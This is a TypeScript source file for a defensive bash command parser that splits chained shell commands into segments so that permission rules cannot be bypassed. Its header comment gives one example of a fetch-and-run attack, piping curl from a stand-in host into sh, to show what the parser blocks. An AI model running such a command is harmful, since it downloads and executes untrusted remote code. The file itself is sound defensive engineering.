/**
 * Decomposes a bash command string into the individual commands a shell would
 * actually run, for permission matching (ADR 0004). A rule authorizes a chained
 * command only if every resulting segment matches — so a narrow rule like
 * `git commit:*` can never authorize `git commit -m x && curl evil.com | sh`.
 *
 * Classification is deliberately conservative: any construct the tokenizer does
 * not fully model — command substitution, backticks, process substitution, an
 * unterminated quote — returns "unparseable" rather than a partial or best-effort
 * segment list. A caller must never treat "unparseable" as "no segments" (which
 * would vacuously authorize the call); it must resolve to `ask`.
 */

export type BashCommandClassification =
	| { type: "empty" }
	| { type: "unparseable" }
	| { type: "segments"; segments: readonly string[] };

const ESCAPABLE_IN_DOUBLE_QUOTES = new Set(["$", "`", '"', "\\", "\n"]);

export function classifyBashCommand(command: string): BashCommandClassification {
	const segments: string[] = [];
	let current = "";
	let quote: '"' | "'" | undefined;
	let i = 0;
	const n = command.length;

	const pushSegment = (): void => {
		const trimmed = current.trim();
		if (trimmed) segments.push(trimmed);
		current = "";
	};

	while (i < n) {
		const ch = command[i];
		const next = command[i + 1];

		if (quote === "'") {
			// Single quotes are fully literal in bash: no escaping, no substitution.
			if (ch === "'") {
				quote = undefined;
				current += ch;
				i++;
				continue;
			}
			current += ch;
			i++;
			continue;
		}

		// Command/backtick substitution is live both unquoted and inside double
		// quotes — only single quotes suppress it. Checked before double-quote
		// escape handling so an unrecognized-in-bash backslash pairing can never
		// hide a real substitution trigger from this check.
		if (ch === "$" && next === "(") return { type: "unparseable" };
		if (ch === "`") return { type: "unparseable" };
		if (quote === undefined && ch === "<" && next === "(") return { type: "unparseable" };
		if (quote === undefined && ch === ">" && next === "(") return { type: "unparseable" };

		if (quote === '"') {
			if (ch === '"') {
				quote = undefined;
				current += ch;
				i++;
				continue;
			}
			if (ch === "$") return { type: "unparseable" };
			if (ch === "\\" && next !== undefined && ESCAPABLE_IN_DOUBLE_QUOTES.has(next)) {
				current += ch + next;
				i += 2;
				continue;
			}
			current += ch;
			i++;
			continue;
		}

		// Unquoted.
		if (ch === "'" || ch === '"') {
			quote = ch;
			current += ch;
			i++;
			continue;
		}
		if (ch === "\\" && next !== undefined) {
			current += ch + next;
			i += 2;
			continue;
		}
		// These forms make a seemingly read-only command perform I/O, expand into
		// different arguments, or introduce grammar this deliberately small parser
		// cannot prove safe. A permission rule must never authorize them by prefix.
		if (
			ch === "<" ||
			ch === ">" ||
			ch === "$" ||
			ch === "{" ||
			ch === "}" ||
			ch === "(" ||
			ch === ")" ||
			ch === "*" ||
			ch === "?" ||
			ch === "[" ||
			ch === "]" ||
			ch === "~"
		) {
			return { type: "unparseable" };
		}
		if (ch === "\n" || ch === ";") {
			pushSegment();
			i++;
			continue;
		}
		if (ch === "&" && next === "&") {
			pushSegment();
			i += 2;
			continue;
		}
		if (ch === "|" && next === "|") {
			pushSegment();
			i += 2;
			continue;
		}
		if (ch === "|" || ch === "&") {
			pushSegment();
			i++;
			continue;
		}

		current += ch;
		i++;
	}

	if (quote !== undefined) return { type: "unparseable" }; // unterminated quote

	pushSegment();

	return segments.length === 0 ? { type: "empty" } : { type: "segments", segments };
}
